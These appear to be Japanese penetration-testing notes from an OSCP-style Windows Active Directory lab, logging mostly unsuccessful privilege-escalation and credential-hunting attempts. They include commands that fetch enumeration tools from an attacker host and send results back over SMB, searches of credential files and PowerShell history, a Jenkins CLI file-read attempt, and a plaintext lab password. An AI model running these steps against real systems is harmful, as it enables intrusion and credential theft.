# 試行錯誤の結果

## sqlcmd

```powershell
PS C:\Program Files\Microsoft SQL Server> sqlcmd -S 127.0.0.1,1434 -A -E
sqlcmd : Sqlcmd: Error: Microsoft ODBC Driver 17 for SQL Server : SQL Server Network Interfaces: Connection string is not valid [87]. .
At line:1 char:1
+ sqlcmd -S 127.0.0.1,1434 -A -E
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (Sqlcmd: Error: ...t valid [87]. .:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

Sqlcmd: Error: Microsoft ODBC Driver 17 for SQL Server : Login timeout expired.
Sqlcmd: Error: Microsoft ODBC Driver 17 for SQL Server : A network-related or instance-specific error has occurred while establishing a connection to SQL Server. Server is not found or not accessible. Check if instance name is correct and if SQL
Server is configured to allow remote connections. For more information see SQL Server Books Online..
PS C:\Program Files\Microsoft SQL Server> cd /
PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---       10/10/2024   6:00 AM                Program Files
d-----        10/9/2024   1:48 PM                Program Files (x86)
d-r---        10/9/2024   1:57 PM                Users
d-----        10/9/2024  12:28 PM                Windows
-a----        2/22/2026   8:56 AM           2665 output.txt

```

```powershell
PS C:\> cd .\Windows\
PS C:\Windows> cd .\Temp\
PS C:\Windows\Temp> dir
dir : Access to the path 'C:\Windows\Temp' is denied.
At line:1 char:1
+ dir
+ ~~~
    + CategoryInfo          : PermissionDenied: (C:\Windows\Temp:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

## パスワード探索

```powrshell
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -FilterXPath "*[System[EventID=4104]]" | 
  Select-Object TimeCreated, Message | 
  Where-Object {$_.Message -match "Password|password|ConvertTo-SecureString"} |
  Format-List
```
→特になし（サンプルのパスワードのみ）

- ファイル再帰探索も何もなし
```powershell
PS C:\> ls -file -recurse -include "password" -ErrorAction SilentlyContinue
PS C:\> ls -file -recurse -include "Password" -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\ -Include *.ps1,*.xml,*.txt,*.config,*.ini -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"`
```

## JENKINS

```powershell
┌──(koshi㉿kali)-[~/Exam/AD/SRV]
└─$ java -jar jenkins-cli.jar -s http://172.16.104.202:8080/ -http help "@C:\Windows\win.ini"

ERROR: You must authenticate to access this Jenkins.
Jenkins CLI
```

```powershell
C:\Windows\System32\config\systemprofile\AppData\Local\Jenkins\.jenkins\secrets\initialAdminPassword
```

## 共有の列挙

```powershell
# from wk26
*Evil-WinRM* PS C:\PublicShare> ls \\172.16.104.202\C$\Users\jenkins
Access is denied
At line:1 char:1
+ ls \\172.16.104.202\C$\Users\jenkins
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\172.16.104.202\C$\Users\jenkins:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
Cannot find path '\\172.16.104.202\C$\Users\jenkins' because it does not exist.
At line:1 char:1
+ ls \\172.16.104.202\C$\Users\jenkins
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (\\172.16.104.202\C$\Users\jenkins:String) [Get-ChildItem], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetChildItemCommand

```


# Local

## Auto w/ [Seatbelt](https://github.com/GhostPack/Seatbelt)

### 転送・実行

```zsh
# Attacker
mkdir share
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Seatbelt.exe -O share/Seatbelt.exe
impacket-smbserver -smb2support -username username -password pw share share
```
```powershell
# Target
net use \\192.168.49.104\share /user:username pw
cp \\192.168.49.104\share\Seatbelt.exe .
.\Seatbelt.exe -group=all | Tee-Object -FilePath \\192.168.49.104\share\seatbelt_result.txt
```

```powershell
.\Seatbelt.exe -group=all | Tee-Object -FilePath \\172.16.104.206\Transfer\seatbelt_result.txt
```

### 実行結果抽出

```powershell

```


## Auto w/ [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

### 転送・実行

listenrがうまくいかないので、base64 encodeして強制的に転送しようとしたけど無理だったので、WK26でshareを作成
```powershell
Invoke-WebRequest -Uri http://192.168.49.104:443/winPEASx64.exe -Outfile .\WinPEASx64.exe

# フォルダの作成
mkdir C:\PublicShare

# 共有の設定（Everyoneにフルコントロールを付与）
net share Transfer=C:\PublicShare /grant:Everyone,FULL

# フォルダ自体の権限をEveryoneフルコントロールに
icacls C:\PublicShare /grant "Everyone:(OI)(CI)F" /T
```

```sh
copy \\172.16.104.206\Transfer\WinPEASx64.exe .
```
```powershell
.\winPEASx64.exe | Tee-Object -FilePath \\172.16.104.206\Transfer\peas_result.txt
```

### 実行結果抽出

```powershell
PS C:\Program Files\Microsoft SQL Server> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


---

╔══════════╣ PowerShell events - script block logs (EID 4104) - searching for sensitive data.

   User Id         :        S-1-5-21-318536300-2164503644-2098472648-500
   Event Id        :        4104
   Context         :        Write-CWarningOnce -Message ('You passed a plain text password to `Initialize-CLcm`. A future version of Carbon will remove support for plain-text passwords. Please pass a `SecureString` instead.')
{
if( $CertPassword -and $CertPassword -isnot [securestring] )
ConvertTo-SecureString -String $CertPassword -AsPlainText -Force
}
$thumbprint = $null
if( $CertificateID )
   Created At      :        10/9/2024 1:55:57 PM
   Command line    :        ConvertTo-SecureString -String $CertPassword -AsPlainText -Force
```

---
---

## Manual

### ユーザー

```powershell
PS C:\Program Files\Microsoft SQL Server> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
PS C:\Program Files\Microsoft SQL Server> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
OSCP\Travel Agents                         Group            S-1-5-21-2481101513-2954867870-2660283483-1137 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                       Mandatory group, Enabled by default, Enabled group
```


---

### システム情報


---

### ネットワーク


---

### インストール済みアプリケーション

```powershell
PS C:\Program Files\Microsoft SQL Server> # Access denined?????reg query "HKLM\..."????Get-Item "HKLM\.."
PS C:\Program Files\Microsoft SQL Server> $paths = @(
>> "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*","HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*")
PS C:\Program Files\Microsoft SQL Server> Get-ItemProperty -Path $paths -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName } | Select-Object DisplayName, DisplayVersion, InstallLocation | Sort-Object DisplayName

DisplayName                                                        DisplayVersion  InstallLocation
-----------                                                        --------------  ---------------
Browser for SQL Server 2019                                        15.0.2000.5
Java(TM) SE Development Kit 21.0.3 (64-bit)                        21.0.3.0        C:\Program Files\Java\jdk-21\
Jenkins 2.440.3                                                    2.255.4403
Microsoft ODBC Driver 17 for SQL Server                            17.4.0.1
Microsoft OLE DB Driver for SQL Server                             18.2.3.0
Microsoft SQL Server 2012 Native Client                            11.4.7462.6
Microsoft SQL Server 2019 (64-bit)
Microsoft SQL Server 2019 (64-bit)
Microsoft SQL Server 2019 RsFx Driver                              15.0.2000.5
Microsoft SQL Server 2019 Setup (English)                          15.0.2000.5
Microsoft SQL Server 2019 T-SQL Language Service                   15.0.2000.5
Microsoft Visual C++ 2015-2022 Redistributable (x64) - 14.32.31326 14.32.31326.0
Microsoft Visual C++ 2015-2022 Redistributable (x86) - 14.32.31326 14.32.31326.0
Microsoft Visual C++ 2022 X64 Additional Runtime - 14.32.31326     14.32.31326
Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.32.31326        14.32.31326
Microsoft Visual C++ 2022 X86 Additional Runtime - 14.32.31326     14.32.31326
Microsoft Visual C++ 2022 X86 Minimum Runtime - 14.32.31326        14.32.31326
Microsoft VSS Writer for SQL Server 2019                           15.0.2000.5
SQL Server 2019 Batch Parser                                       15.0.2000.5
SQL Server 2019 Common Files                                       15.0.2000.5
SQL Server 2019 Common Files                                       15.0.2000.5
SQL Server 2019 Connection Info                                    15.0.2000.5
SQL Server 2019 Connection Info                                    15.0.2000.5
SQL Server 2019 Database Engine Services                           15.0.2000.5
SQL Server 2019 Database Engine Services                           15.0.2000.5
SQL Server 2019 Database Engine Shared                             15.0.2000.5
SQL Server 2019 Database Engine Shared                             15.0.2000.5
SQL Server 2019 DMF                                                15.0.2000.5
SQL Server 2019 DMF                                                15.0.2000.5
SQL Server 2019 Shared Management Objects                          15.0.2000.5
SQL Server 2019 Shared Management Objects                          15.0.2000.5
SQL Server 2019 Shared Management Objects Extensions               15.0.2000.5
SQL Server 2019 Shared Management Objects Extensions               15.0.2000.5
SQL Server 2019 SQL Diagnostics                                    15.0.2000.5
SQL Server 2019 XEvent                                             15.0.2000.5
SQL Server 2019 XEvent                                             15.0.2000.5
VMware Tools                                                       12.1.0.20219665 C:\Program Files\VMware\VMware Tools\
```

---

### 実行中のプロセス


---

### サービス

```powershell
type C:\Users\b.martin\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
PS C:\Program Files\Microsoft SQL Server> # cmd.exe???:sc query [service] · sc qc [service]
PS C:\Program Files\Microsoft SQL Server> Get-CimInstance -ClassName Win32_Service |
>>   Where-Object {
>>       $_.State -eq 'Running' -and
>>       $_.StartName -notin @('NT AUTHORITY\LocalService', 'NT AUTHORITY\NetworkService')
>>   } |
>>   Select-Object Name, StartName, PathName

Name                          StartName                 PathName
----                          ---------                 --------
DiagTrack                     LocalSystem               C:\Windows\System32\svchost.exe -k utcsvc -p
DsmSvc                        LocalSystem               C:\Windows\system32\svchost.exe -k netsvcs -p
DsSvc                         LocalSystem               C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
gpsvc                         LocalSystem               C:\Windows\system32\svchost.exe -k netsvcs -p
IKEEXT                        LocalSystem               C:\Windows\system32\svchost.exe -k netsvcs -p
iphlpsvc                      LocalSystem               C:\Windows\System32\svchost.exe -k NetSvcs -p
Jenkins                       .\jenkins                 "C:\Program Files\Jenkins\jenkins.exe"
KeyIso                        LocalSystem               C:\Windows\system32\lsass.exe
LanmanServer                  LocalSystem               C:\Windows\System32\svchost.exe -k smbsvcs
LSM
MSSQLSERVER                   NT Service\MSSQLSERVER    "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\sqlservr.exe" -sMSSQLSERVER
NcbService                    LocalSystem               C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
Netlogon                      LocalSystem               C:\Windows\system32\lsass.exe
Netman                        LocalSystem               C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
PcaSvc                        LocalSystem               C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
PlugPlay                      LocalSystem               C:\Windows\system32\svchost.exe -k DcomLaunch -p
Power                         LocalSystem               C:\Windows\system32\svchost.exe -k DcomLaunch -p
ProfSvc                       LocalSystem               C:\Windows\system32\svchost.exe -k netsvcs -p
RasMan                        localSystem               C:\Windows\System32\svchost.exe -k netsvcs
SamSs                         LocalSystem               C:\Windows\system32\lsass.exe
Schedule                      LocalSystem               C:\Windows\system32\svchost.exe -k netsvcs -p
SENS                          LocalSystem               C:\Windows\system32\svchost.exe -k netsvcs -p
SessionEnv                    localSystem               C:\Windows\System32\svchost.exe -k netsvcs -p
ShellHWDetection              LocalSystem               C:\Windows\System32\svchost.exe -k netsvcs -p
SQLSERVERAGENT                NT Service\SQLSERVERAGENT "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\SQLAGENT.EXE" -i MSSQLSERVER
SQLTELEMETRY                  NT Service\SQLTELEMETRY   "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\sqlceip.exe" -Service
SQLWriter                     LocalSystem               "C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe"
StateRepository               LocalSystem               C:\Windows\system32\svchost.exe -k appmodel -p
StorSvc                       LocalSystem               C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
SysMain                       LocalSystem               C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
SystemEventsBroker            LocalSystem               C:\Windows\system32\svchost.exe -k DcomLaunch -p
TabletInputService            LocalSystem               C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
Themes                        LocalSystem               C:\Windows\System32\svchost.exe -k netsvcs -p
TokenBroker                   LocalSystem               C:\Windows\system32\svchost.exe -k netsvcs -p
TrkWks                        LocalSystem               C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
UALSVC                        LocalSystem               C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
UmRdpService                  localSystem               C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
UserManager                   LocalSystem               C:\Windows\system32\svchost.exe -k netsvcs -p
UsoSvc                        LocalSystem               C:\Windows\system32\svchost.exe -k netsvcs -p
VaultSvc                      LocalSystem               C:\Windows\system32\lsass.exe
VGAuthService                 LocalSystem               "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
VM3DService                   LocalSystem               C:\Windows\system32\vm3dservice.exe
VMTools                       LocalSystem               "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
WdiSystemHost                 LocalSystem               C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
Winmgmt                       localSystem               C:\Windows\system32\svchost.exe -k netsvcs -p
WpnService                    LocalSystem               C:\Windows\system32\svchost.exe -k netsvcs -p
CDPUserSvc_13ac89                                       
```

- ちなみにjenkinsディレクトリにアクセスはできない
```powershell
PS C:\Program Files\Microsoft SQL Server> dir 'C:\Program Files\Jenkins\'
dir : Access to the path 'C:\Program Files\Jenkins' is denied.
At line:1 char:1
+ dir 'C:\Program Files\Jenkins\'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Program Files\Jenkins\:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

```powershell
PS C:\Program Files\Microsoft SQL Server> Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\* |
>>   Where-Object {
>>     $_.ObjectName -and
>>     $_.ObjectName -notmatch 'LocalService|NetworkService' -and
>>     $_.ImagePath -and
>>     $_.ImagePath -notmatch '^"?C:\\Windows\\'
>>     # unquoted service path?
>>     # $_.PathName -notmatch '"'
>>   } |
>>   Select PSChildName, ImagePath, ObjectName

PSChildName    ImagePath                                                                                          ObjectName
-----------    ---------                                                                                          ----------
Jenkins        "C:\Program Files\Jenkins\jenkins.exe"                                                             .\jenkins
MSSQLSERVER    "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\sqlservr.exe" -sMSSQLSERVER  NT Service\MSSQLSERVER
Sense          "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                         LocalSystem
SQLSERVERAGENT "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\SQLAGENT.EXE" -i MSSQLSERVER NT Service\SQLSERVERAGENT
SQLTELEMETRY   "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\sqlceip.exe" -Service        NT Service\SQLTELEMETRY
SQLWriter      "C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe"                                    LocalSystem
VGAuthService  "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                             LocalSystem
VMTools        "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                LocalSystem
```

- 編集可能なサービスはなさそう
```powershell
PS C:\Users\b.martin> Get-ModifiableServiceFile
Get-Acl : Attempted to perform an unauthorized operation.
At C:\Users\b.martin\PowerUp.ps1:898 char:17
+                 Get-Acl -Path $CandidatePath | Select-Object -ExpandP ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [Get-Acl], UnauthorizedAccessException
    + FullyQualifiedErrorId : System.UnauthorizedAccessException,Microsoft.PowerShell.Commands.GetAclCommand
```

---

### スケジュールタスク

- 以下特にヒットなし
```powershell
$header="HostName","TaskName","NextRunTime","Status","LogonMode","LastRunTime","LastResult","Author","TaskToRun","StartIn","Comment","ScheduledTaskState","IdleTime","PowerManagement","RunAsUser","DeleteTaskIfNotRescheduled","StopTaskIfRunsXHoursandXMins","Schedule","ScheduleType","StartTime","StartDate","EndDate","Days","Months","RepeatEvery","RepeatUntilTime","RepeatUntilDuration","RepeatStopIfStillRunning"
schtasks /query /fo csv /nh /v | ConvertFrom-Csv -Header $header | select -uniq TaskName,NextRunTime,ScheduleType,Status,TaskToRun,RunAsUser | Where-Object {$_.RunAsUser -ne $env:UserName -and $_.TaskToRun -notlike "%windir%*" -and $_.TaskToRun -ne "COM handler" -and $_.TaskToRun -notlike "%systemroot%*" -and $_.TaskToRun -notlike "C:\Windows\*" -and $_.TaskName -notlike "\Microsoft\Windows\*"}
```

```powershell
Get-ModifiableScheduledTaskFile
```

---
# AD

### domain共有

```powershell
copy \\172.16.104.206\Transfer\powerview.ps1 .
```
```powershell
Find-DomainShare -CheckShareAccess
```

```powershell
PS C:\Users\b.martin> Find-DomainShare -CheckShareAccess

Name           Type Remark              ComputerName
----           ---- ------              ------------
NETLOGON          0 Logon server share  DC20.oscp.exam
SYSVOL            0 Logon server share  DC20.oscp.exam
ADMIN$   2147483648 Remote Admin        SRV22.oscp.exam
C$       2147483648 Default share       SRV22.oscp.exam
Transfer          0                     WS26.oscp.exam
```

- SMB共有経由で列挙するもJENKINSにアクセスできず
```powershell
S C:\Users\b.martin> ls '\\SRV22.oscp.exam\C$\Program Files\Jenkins'
ls : Access to the path '\\SRV22.oscp.exam\C$\Program Files\Jenkins' is denied.
At line:1 char:1
+ ls '\\SRV22.oscp.exam\C$\Program Files\Jenkins'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (\\SRV22.oscp.ex...m Files\Jenkins:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand
```

 - 以下のどれも失敗する
```powershell
dir C:\ /s /b | findstr config.xml
-  dir C:\Users\Public /s （共有フォルダに関連するゴミがないか）
-  dir \\SRV\C$ や dir \\SRV22\Jenkins
- dir C:\Windows\System32\config\systemprofile\

-  SMBでC$経由でJenkinsディレクトリにアクセスを試みる
-  dir \\SRV22\C$\Program Files\Jenkins\
-  dir\\SRV22\C$\ProgramData\Jenkins\
-  dir \\SRV22\C$\Windows\System32\config\systemprofile\.jenkins\
```

### SPN

```powershell
PS C:\Users\b.martin> Get-NetUser -SPN | select samaccountname,serviceprincipalname

samaccountname serviceprincipalname
-------------- --------------------
krbtgt         kadmin/changepw
```

### Groupの探索

- Travel agencyってなんだ？
- なにもoutbound controlもってないし、なんでもなさそう
- メンバーはb.martinだけ
![[Pasted image 20260223004701.png]]

---


---
---

# Credential harvesting

- cmdkeyなし
- `env`なし
- powershell history: なし（自分がやったコマンドだけ）

## 興味深い情報

### configファイルの探索

```powershell
```

### Users

- 自身のディレクトリのみアクセス可能で、jenkinsにはアクセスできない
```powershell

```

### Microsoft SQL Server

```powershell
PS C:\Program Files> cd '.\Microsoft SQL Server\'
PS C:\Program Files\Microsoft SQL Server> ls -Recurse -Include *.txt,*.ini,*.cfg,*.config,*conf,*.xml,*.git,*.ps1,*.yml -File | Select-String -Pattern "pass(word)?|pwd|cred(ential)?" -List | Select-Object -ExpandProperty Path
C:\Program Files\Microsoft SQL Server\150\DTS\Connections\en\Microsoft.SqlServer.ManagedConnections.xml
C:\Program Files\Microsoft SQL Server\150\DTS\ForEachEnumerators\en\Microsoft.SqlServer.ForEachAdoEnumerator.xml
C:\Program Files\Microsoft SQL Server\150\DTS\ForEachEnumerators\en\Microsoft.SqlServer.ForEachSMOEnumerator.xml
C:\Program Files\Microsoft SQL Server\150\DTS\Tasks\en\Microsoft.SqlServer.TransferJobsTask.xml
C:\Program Files\Microsoft SQL Server\150\DTS\Tasks\en\Microsoft.SqlServer.TransferLoginsTask.xml
C:\Program Files\Microsoft SQL Server\150\DTS\Tasks\en\Microsoft.SqlServer.TransferStoredProceduresTask.xml
C:\Program Files\Microsoft SQL Server\150\DTS\Tasks\en\Microsoft.SqlServer.WebServiceTask.xml
C:\Program Files\Microsoft SQL Server\150\DTS\Tasks\en\Microsoft.SqlServer.WMIDRTask.xml
C:\Program Files\Microsoft SQL Server\150\DTS\Tasks\en\Microsoft.SqlServer.WMIEWTask.xml
C:\Program Files\Microsoft SQL Server\150\SDK\Assemblies\en\Microsoft.SqlServer.Replication.xml
C:\Program Files\Microsoft SQL Server\150\Setup Bootstrap\Log\20241009_121735\Datastore\InputSettings_ChainerSettings_SlpSettings.xml
C:\Program Files\Microsoft SQL Server\150\Setup Bootstrap\Log\20241009_121735\Datastore\ProductSettings_Agent_Public.xml
C:\Program Files\Microsoft SQL Server\150\Setup Bootstrap\Log\20241009_121735\Datastore\ProductSettings_AS_Private.xml
C:\Program Files\Microsoft SQL Server\150\Setup Bootstrap\Log\20241009_121735\Datastore\ProductSettings_ClusterNode_Public.xml
C:\Program Files\Microsoft SQL Server\150\Setup Bootstrap\Log\20241009_121735\Datastore\ProductSettings_SqlEngine_Private.xml
C:\Program Files\Microsoft SQL Server\150\Setup Bootstrap\Log\20241009_121735\Datastore\ProductSettings_SqlEngine_Public.xml
C:\Program Files\Microsoft SQL Server\150\Setup Bootstrap\Log\20241009_121735\Datastore\RunRuleResults_RunFeatureSpecificConfigRules.xml
C:\Program Files\Microsoft SQL Server\150\Setup Bootstrap\Log\20241009_121735\Datastore\RunRuleResults_RunFeatureSpecificRules.xml
C:\Program Files\Microsoft SQL Server\150\Setup Bootstrap\Log\20241009_121735\Datastore\RunRuleResults_RunScenarioGlobalRules.xml
C:\Program Files\Microsoft SQL Server\150\Setup Bootstrap\Log\20241009_121735\Datastore\RunRuleResults_RunStandaloneRules.xml
C:\Program Files\Microsoft SQL Server\150\Setup Bootstrap\Log\20241009_121735\Datastore\SLP_Actions_PersistedActionData.xml
C:\Program Files\Microsoft SQL Server\150\Setup Bootstrap\Log\20241009_121735\ConfigurationFile.ini
C:\Program Files\Microsoft SQL Server\150\Setup Bootstrap\Log\20241009_121735\Detail.txt
C:\Program Files\Microsoft SQL Server\150\Setup Bootstrap\Log\20241009_121735\Settings.xml
C:\Program Files\Microsoft SQL Server\150\Setup Bootstrap\Log\20241009_121735\SQLServer_ERRORLOG_2024-10-09T12.21.06.txt
C:\Program Files\Microsoft SQL Server\150\Setup Bootstrap\Log\20241009_121735\Summary_SRV22_20241009_121735.txt
C:\Program Files\Microsoft SQL Server\150\Setup Bootstrap\Log\Summary.txt
C:\Program Files\Microsoft SQL Server\150\Setup Bootstrap\SQL2019\1033_ENU_LP\x64\1033\ThirdPartyNotices.txt
C:\Program Files\Microsoft SQL Server\150\Setup Bootstrap\SQL2019\x64\PidPrivateConfigObjectMaps.xml
C:\Program Files\Microsoft SQL Server\150\Shared\hkengperfctr.xml
C:\Program Files\Microsoft SQL Server\150\Tools\Binn\Resources\1033\sqlcm.xml
ls : Access to the path 'C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Backup' is denied.
At line:1 char:1
+ ls -Recurse -Include *.txt,*.ini,*.cfg,*.config,*conf,*.xml,*.git,*.p ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Program File...ER\MSSQL\Backup:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

ls : Access to the path 'C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\Xtp' is denied.
At line:1 char:1
+ ls -Recurse -Include *.txt,*.ini,*.cfg,*.config,*conf,*.xml,*.git,*.p ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Program File...\MSSQL\Binn\Xtp:String) [Get-ChildItem], UnauthorizedAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\perf-MSSQLSERVERsqlctr.ini
C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn\sqlctr.ini
```

```powershell
PS C:\Program Files\Microsoft SQL Server> sqlcmd -U b.martin -P BusyWorkerDay777 -l 30
sqlcmd : Sqlcmd: Error: Microsoft ODBC Driver 17 for SQL Server : Login failed for user 'b.martin'..
At line:1 char:1
+ sqlcmd -U b.martin -P BusyWorkerDay777 -l 30
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (Sqlcmd: Error: ...er 'b.martin'..:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
```

- windows認証を試すも失敗
```powershell
PS C:\Program Files\Microsoft SQL Server> sqlcmd -E
PS C:\Program Files\Microsoft SQL Server> sqlcmd -S localhost -E -l 30
PS C:\Program Files\Microsoft SQL Server>
```

- ポート指定して実行するも失敗
```powershell
PS C:\Program Files\Microsoft SQL Server> sqlcmd -S 127.0.0.1,1434 -E
sqlcmd : Sqlcmd: Error: Microsoft ODBC Driver 17 for SQL Server : Login failed for user 'OSCP\b.martin'..
At line:1 char:1
+ sqlcmd -S 127.0.0.1,1434 -E
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (Sqlcmd: Error: ...SCP\b.martin'..:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError

```

## snaffler

```powershell
copy \\172.16.104.206\Transfer\Snaffler.exe .
.\Snaffler.exe -s -o snaffler.out
```
```powershell
PS C:\Users\b.martin> .\Snaffler.exe -s -o snaffler.out
 .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$""   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler


[OSCP\b.martin@SRV22] 2026-02-22 15:15:36Z [Info] Parsing args...
[OSCP\b.martin@SRV22] 2026-02-22 15:15:36Z [Info] Parsed args successfully.
[OSCP\b.martin@SRV22] 2026-02-22 15:15:36Z [Info] Invoking DFS Discovery because no ComputerTargets or PathTargets were specified
[OSCP\b.martin@SRV22] 2026-02-22 15:15:36Z [Info] Getting DFS paths from AD.
[OSCP\b.martin@SRV22] 2026-02-22 15:15:36Z [Info] Found 0 DFS Shares in 0 namespaces.
[OSCP\b.martin@SRV22] 2026-02-22 15:15:36Z [Info] Invoking full domain computer discovery.
[OSCP\b.martin@SRV22] 2026-02-22 15:15:36Z [Info] Getting computers from AD.
[OSCP\b.martin@SRV22] 2026-02-22 15:15:36Z [Info] Got 3 computers from AD.
[OSCP\b.martin@SRV22] 2026-02-22 15:15:36Z [Info] Starting to look for readable shares...
